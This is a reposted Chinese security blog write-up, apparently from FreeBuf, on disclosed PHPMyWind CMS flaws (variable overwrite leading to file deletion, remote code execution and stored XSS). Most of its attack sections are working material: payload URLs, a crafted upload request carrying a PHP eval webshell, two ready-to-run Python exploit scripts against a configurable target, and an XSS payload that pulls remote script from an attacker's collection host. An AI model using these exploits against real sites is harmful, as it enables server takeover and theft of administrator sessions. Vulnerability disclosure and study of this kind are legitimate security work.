<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uJpeqQrxAEH1V3j9Fip13g)

扫码领资料

获渗透教程

免费&进群

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

随

作者：Heihu577 

原文地址：https://www.freebuf.com/vuls/326936.html

为什么写这篇文章，又为什么挖掘到这个CMS的漏洞，其实也是有一些原因的。

最近在给学员做培训，备课到变量覆盖的时候没有什么特别好的例子，随后就想到之前有审计一个CMS叫PHPMyWind，随后我download下来了v5.6.beta版本。

该漏洞已经提交至CNVD，并评分为10.0漏洞评分，如图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNwhYXMvhKHlyISZjNlgXTLyEGu1fNqUZsKUsMlib37vX9vOXicUEfDNagw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

---

 **变量覆盖点**
----------

因为在之前我是挖掘过这个CMS的，当时是一个后台的任意文件删除，今天的话算是跟老朋友打交道了，我们看一下咱们变量覆盖点，如图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNw42VtzEZ9bj1jdWcNMibxUHhibklSGwvgYtSCEthxop7Bo2CX2ficFgicTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里我们可以看到，存在一个变量覆盖问题，但是却将所有覆盖的变量进行addslashes处理了，也算一种安全机制。

如果仔细观察的话，这里的正则是存在一个缺陷的，如图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNwlwSjZK0oUFxmCG0XUY8Y4UtrWAlIlm1wDFhSicUYxmcfnKMwSP8WvUw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

并没有过滤$_SERVER以及$_FILES，也就是说，我们是可以伪造$_SERVER以及$_FILES的。

**审计思路**
--------

首先我想到的是全局搜索$_FILES，但是这种变量覆盖去覆盖$_FILES是有缺陷的，因为一个$_FILES的变量覆盖的话tmp_name也会随之消失，如图（简单demo）：

> <?php  
> if($_SERVER['REQUEST_METHOD'] == 'GET'){  
> $html = <<<HTML  
> <form action="" method="post" enctype="multipart/form-data">  
> <input type="file" >  
> <input type="submit">  
> </form>  
> HTML;  
> echo $html;  
> }else{  
> extract($_GET);  
> var_dump($_FILES);  
> }

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNwmT82Urj1aOo6uNJ6984myowZ4uDFIA9ADMr4vhXtQo6yIick0jVy0hg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果WEB中使用is_uploaded_file进行判断的话，我们是绕不过这个判断的，因为我们并不知道PHP接收到的临时文件名称是什么。

我们可以看一下该程序员$_FILES处理习惯，如图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNwmuxtS2OwWLOJYyxvbka7Z3U1ZJ3K4fFApicb8gEaGdibt3NEn64lp1QQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

其实这只是单个文件，其他文件中几乎都会使用is_uploaded_file进行判断然后再上传，那么我们覆盖$_FILES的作用其实也小了很多，因为我们覆盖并无法进行getshell。

然后就是我说的第二个，$_SERVER没有被过滤，在这里很多审计师傅都会想到XXF头注入吧，我们看一下该CMS处理ip的一个方法：

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGbkHaNjGM90AdtJUUW7UNwSRKLTJDk8bV2UfYnXgqUr7XlXUIMvwzBNYxLNgIZXRfEY2sGU6tOrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

其实看到这里内心确实是拔凉拔凉的。

**漫长审计之旅**
----------

其实在$_FILES的全局搜索中，我是遇到了一个特别让人眼前一亮的东西

在data/avatar/lib/Controller/AvatarFlashUpload.php文件中，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

其实看到这里的时候，大家会不会觉得，八成已经搞下了，但其实真正的游戏才刚刚开始，我们先梳理起来如何调用到该文件。目前处于一个类中，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

全局搜索，看哪里实例化了Controller_AvatarFlashUpload类对象，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这样的话我们的upload.php文件就可以作为入口点。路由检查及变量覆盖检查：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那么我们开始一步一步审计。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

getgpc方法很容易理解，只是获得到$_GET[agent]的值，随后调用到init_input方法中，跟进init_input方法，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过图中的逻辑我们可以知道，该传输使用了类似于dz加密的一种方式，我们必须手上持有Key才可以进行传递任意数据。难道这样就无解了么？答案是否定的。

笔者发现该CMS还有一个AuthCode方法，它处于/include/common.func.php文件之中，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个方法的加解密逻辑与common::authcode的逻辑是一样的，key也是一致的，发现这个有什么用呢？我们这里可以全局搜索一下谁调用了AuthCode方法，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在shoppingcart.php文件中，有一处AuthCode加密操作，将一个数组进行serialize序列化，随后放入到客户端浏览器Cookie当中，其实这里我们最主要关注的是“$goodsattr”变量，它是可以存放字符串的。

那么我们再转过头来看一下init_input的处理逻辑，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在这里它使用parse_str将$input解密后的值以“key1=value1&key2=value2”分割为一个数组，接下来的一系列操作都是在该数组之上的，那么我们是否可以在shoppingcart.php生成的序列化字符串中进行注入parse_str的解析逻辑？（简单demo）：

> <?php  
> $arr = array(  
> 'test'  => $_GET['test']  
> );  
> $data = serialize($arr);  
> parse_str($data, $tester);  
> var_dump($tester);

如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

此时我们就可以注入任意key与value，就达到了伪造$this->input的效果。

又因为shoppingcart.php文件需要普通的用户登录才可以使用（购物车功能），那么我们整理攻击逻辑：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

等等，我们待会儿再构造Payload，在这里我们先看一下下面的逻辑：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

其实这里if中的第二个判断条件我们可以直接忽略不计，我们可以通过变量覆盖将$_SERVER[HTTP_USER_AGENT]覆盖为数组，这样的话md5函数会返回空，$agent的结果也是NULL，这里条件就会返回false，就不会进入到exit中。

再往下有一个time，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里的话比较简单，因为我们可以恶意注入input中的值，这里我们直接将time赋值为999999999999，避免进入到elseif中的exit函数中。

然后我们可以进行恶意注入$uid，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这样的话我们可以完成一个任意文件删除漏洞。

### **--- 前台任意文件删除漏洞（CNVD-2022-24939）**

### 

### 其实进入到unlink函数的思路在上面我们已经说过了，那么我们这里记载一下攻击顺序，首先登录一个普通用户（没有的话注册一个），如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功之后，访问shoppingcart.php，发送Payload:

shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999%26uid=1%26a=1

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

那么访问upload.php的payload:  

?input={****cookie}****&a=uploadavatar&_SERVER[HTTP_USER_AGENT][]=1&_FILES[Filedata][tmp_name]=../install_lock.txt&_FILES[Filedata][name]=.php

如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这样的话，我们成功删除了安装时检查的install_lock.txt文件，访问/install/目录进行安装cms，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 

### **--- 前台RCE漏洞（CNVD-2022-24937）**

###   

### 当然了，此时肯定有人喷笔者，你这算是什么RCE，难不成必须让人家网站重装？不着急，我们接着往下看。如图：

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

这里的话判断处理使用了getimagesize方法，我们看一下该方法处理一个PHP的demo文件会返回什么，如图：  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里的话就会返回4个NULL，查看下面的逻辑，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

整体逻辑在图中已经解释了，那么我们再来介绍一下getimagesize的width和height如何使用非图片文件进行绕过，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这样的话我们就可以上传一个php文件了，有人又会问了，如果使用define width这种绕过的话，$type岂不是有数值了？其实这里$type同样会返回null，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

但是有一个遗憾的点，可能是该程序作者写出来的bug，在下面realpath的函数调用会返回false，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因为$uid可控，那么我们可以使$uid为1.php，随后调入move_uploaded_file方法。

但是为了防止写到磁盘根目录，这里RCE的话就要符合两种场景中选其一。

### **1：在任意平台下的getshell**

### 

### 这里我们需要开启debug，如图：

###   

### 我们看一下/include/common.inc.php的error_reporting()的调用，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里config.cache.php文件是后台管理员的配置项，$cfg_diserror默认为Y，这里E_ALL是无法屏蔽warning错误的，所以这里我们就可以利用一些PHP异常信息，函数报错等姿势爆出网站的绝对路径，例如：

Payload: data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

报错原理如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我们再往绝对路径下写webshell。

复现过程：

**爆出绝对路径**

Payload: data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**获得密钥信息**

Payload:shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../刚刚得到的绝对路径\1.php%26a=1

构造HTTP请求如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**构造上传请求**

构造HTTP包如下：

> POST /data/avatar/upload.php?a=uploadavatar&input=上步骤复制的Cookie信息&_SERVER[HTTP_USER_AGENT][]=1 HTTP/1.1  
> Host: test1.com  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0  
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
> Accept-Encoding: gzip, deflate  
> Content-Type: multipart/form-data; boundary=---------------------------358400350218435578672887741538  
> Content-Length: 289  
> Connection: close  
> Upgrade-Insecure-Requests: 1
> 
> -----------------------------358400350218435578672887741538  
> Content-Disposition: form-data;  
> Content-Type: image/png
> 
> <?php  
> eval($_REQUEST['c']);  
> ?>  
> #define width 20  
> #define height 20  
> -----------------------------358400350218435578672887741538--

如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果返回url,则表达文件写入成功，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)编写POC：

> import requests, re
> 
> # 配置目标站点  
> url = '目标站点'  
> # member.php中注册用户  
> # 注册完毕手工修改如下cookies  
> cookies = {  
> 'username':'自己配置',  
> 'lastlogintime':'自己配置',  
> 'lastloginip':'自己配置'  
> }  
> def getPath():  
> DebugPath = url + '/data/avatar/upload.php?_SERVER[HTTP_USER_AGENT][]=1'  
> result = requests.get(DebugPath).content.decode('utf-8')  
> try:  
> result = re.findall(' given in <b>(.+?)</b>', result)[0]  
> print('获取路径信息: ' + result)  
> except:  
> print('目标站点未开启DEBUG')  
> exit()  
> return result  
> def getInput(Path):  
> Path = Path.replace('include\common.func.php', '').replace('include/common.func.php', '')  
> if ':' in Path:  
> Path = Path[3:]  
> InputUrl = url + 'shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../{Path}1.php%26a=1'.format(Path=Path)  
> response = requests.get(InputUrl, cookies=cookies)  
> result = ""  
> try:  
> result = response.headers['Set-Cookie'].split('=')[1]  
> print("获取InputKey: " + result)  
> except:  
> print("Input获取失败...")  
> return result  
> def unlinkInstall(Input):  
> UnlinkUrl = url + '/data/avatar/upload.php?a=uploadavatar&input={Input}&_SERVER[HTTP_USER_AGENT][]=1'.format(Input=Input)  
> Data = '''<?php eval($_REQUEST[c]);?>  
> #define width 20  
> #define height 20  
> '''  
> result = requests.post(UnlinkUrl, files={'Filedata':('1.jpg', Data, 'image/jpeg')}).content.decode('utf-8')  
> print(result)  
> if 'http://' in result:  
> print('shell上传成功, 路径为：%s/1.php' % (url))  
>   
> if __name__ == '__main__':  
> Path = getPath()  
> Input = getInput(Path)  
> unlinkInstall(Input)

### 

### **2：在Linux平台下的getshell（通吃）**

### 

### Linux平台不需要报错依赖，直接使用../../../proc/self/cwd/1.php映射到当前工作路径即可。

笔者这里只演示Windows的复现方法，这里的话笔者就直接贴出POC了。

POC:

> import requests, re
> 
> # 配置目标站点  
> url = '目标站点'  
> # member.php?c=reg中注册用户  
> # 注册完毕手工修改如下cookies  
> cookies = {  
> 'username':'自己配置cookie',  
> 'lastlogintime':'自己配置cookie',  
> 'lastloginip':'自己配置cookie'  
> }  
> def getInput():  
> InputUrl = url + 'shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../proc/self/cwd/1.php%26a=1'  
> response = requests.get(InputUrl, cookies=cookies)  
> result = ""  
> try:  
> result = response.headers['Set-Cookie'].split('=')[1]  
> print("获取InputKey: " + result)  
> except:  
> print("Input获取失败...")  
> return result  
> def unlinkInstall(Input):  
> UnlinkUrl = url + '/data/avatar/upload.php?a=uploadavatar&input={Input}&_SERVER[HTTP_USER_AGENT][]=1'.format(Input=Input)  
> Data = '''<?php phpinfo();?>  
> #define width 20  
> #define height 20  
> '''  
> result = requests.post(UnlinkUrl, files={'Filedata':('1.jpg', Data, 'image/jpeg')}).content.decode('utf-8')  
> if 'http://' in result:  
> print('shell上传成功, 路径为：%s/data/avatar/1.php' % (url))  
>   
> if __name__ == '__main__':  
> Input = getInput()  
> unlinkInstall(Input)

### **--- 前台XSS漏洞（CNVD-20****22-24936）**

终于审完前台RCE漏洞，在搜索$_SERVER的途中笔者发现了一个小小的彩蛋，被放入到了INSERT操作中。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

gethostbyname函数对我们的payload无法造成影响，$_SERVER[REMOTE_ADDR]是可以通过变量覆盖进行伪造的，那么这里就造成了一个未过滤XSS的INSERT操作，还是留言板中。

但是有一个问题，就是message表的ip只可以限定20个字符，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

其实到这里也是挺麻烦的，因为<script></script>已经十七个字符了，但是后台引入了jQuery，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

所以这里我们可以通过$.getScript的方式来缩短字符，无论怎样一句话是无法进行远程加载js的，这里的话我想到了多行注释，payload如下（getScript中需要写入你的xss平台接收地址）：

> <script>$./*
> 
> */getScript('//x'/*
> 
> */%2b'0.nz/auIf')/*
> 
> */</script>

通过这种变形拆分，来进行写入js远程加载，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

依次留言完毕后，我们看一下数据库中的信息，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里的话笔者在解释一下为什么需要倒叙插入Payload，在\admin\message.php文件中的SELECT操作，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

看着是没有倒叙的，但其实GetPage方法中，存在SQL语句的封装，如图：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里return返回的是倒叙查询结果，那么我们查看留言记录：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里看着是一条记录，但其实是被我们的多行注释给闭合了，XSS平台接收：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Ending...**
-------------

其实整个漏洞的挖掘过程个人感觉还是比较有趣，在前台文件上传中多次运用了CTF的一些知识。

声明：本公众号所分享内容仅用于网安爱好者之间的技术讨论，禁止用于违法途径，**所有渗透都需获取授权**！否则需自行承担，本公众号及原作者不承担相应的后果.

  

@

**学习更多渗透技能！体验靶场实战练习**

```


![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（hack视频资料及工具）  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)




























```

（部分展示）

  

往期推荐

[

【精选】SRC快速入门+上分小秘籍+实战指南



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528604&idx=1&sn=5ab3a5b3eaf0c56fcdeabccadfdc6bde&chksm=ebea39b1dc9db0a71fa71d233709afdfd2e2e0483ded28cca42044eded300f1c7025bde1b37a&scene=21#wechat_redirect)

[

爬取免费代理，拥有自己的代理池



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247538507&idx=1&sn=012e95638679390d727ad9ac76f8093a&chksm=ebea1e66dc9d977076c87f955d303509c6a5dee9f498e18669ed25463d9403d7bd7fa2935277&scene=21#wechat_redirect)

[

漏洞挖掘｜密码找回中的套路



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247553371&idx=1&sn=28072033cc1b91a53ea3b48b9b070132&chksm=ebea5876dc9dd16059270c801801949f1b56d26ff76b4ca03b263f9d0228a62a068d1832fb7a&scene=21#wechat_redirect)

[

渗透测试岗位面试题(重点：渗透思路)



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247552587&idx=1&sn=3c0717a556f8e2caea0310585da5f33f&chksm=ebea4766dc9dce70f29bb3be417198f68b985df1c420ef7e92958e34f766a1a043c3e3f86a6b&scene=21#wechat_redirect)

[

漏洞挖掘 | 通用型漏洞挖掘思路技巧



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247550572&idx=1&sn=02bc4368e4b6cd0a39ff1ec24a6aa9ad&chksm=ebea4f41dc9dc657549d9dff584294ba534cbdd7bb5205b1eabb07787300a0a58a899c15ac93&scene=21#wechat_redirect)

[

干货｜列了几种均能过安全狗的方法！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524943&idx=1&sn=98644144a3c10bb068ec0f310dcc4958&chksm=ebea2b62dc9da2749321fce7ab28788ced08a2b496e0a45b06a5887b5aa457e48f7a66110301&scene=21#wechat_redirect)

[

一名大学生的黑客成长史到入狱的自述



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247502926&idx=1&sn=8750295399cdcc5e71918c30bb1a974f&chksm=ebea8563dc9d0c75cdf709d2d16fdbdf82abee64516f7a44347f40056969d1b4bc3a1eb2ab2e&scene=21#wechat_redirect)

[

攻防演练｜红队手段之将蓝队逼到关站！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247541662&idx=1&sn=343a8d7764dde2121f6b0373aa4dbd28&chksm=ebea6ab3dc9de3a5ad1f7eadd96bd2d42375d7f4c40bd8c4ea4b4dc000415097a0e3fe0fbd38&scene=21#wechat_redirect)

[巧用FOFA挖到你的第一个漏洞](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521952&idx=1&sn=55ab0613e5a7ba79b78849b4d91451f6&chksm=ebeadf8ddc9d569bcc64e99414dcbe6878a0b2c9f5c057b30c4bbe465ba76fcaa64e66caa0c2&scene=21#wechat_redirect)

  

**看到这里了，点个“赞”、“再看”吧**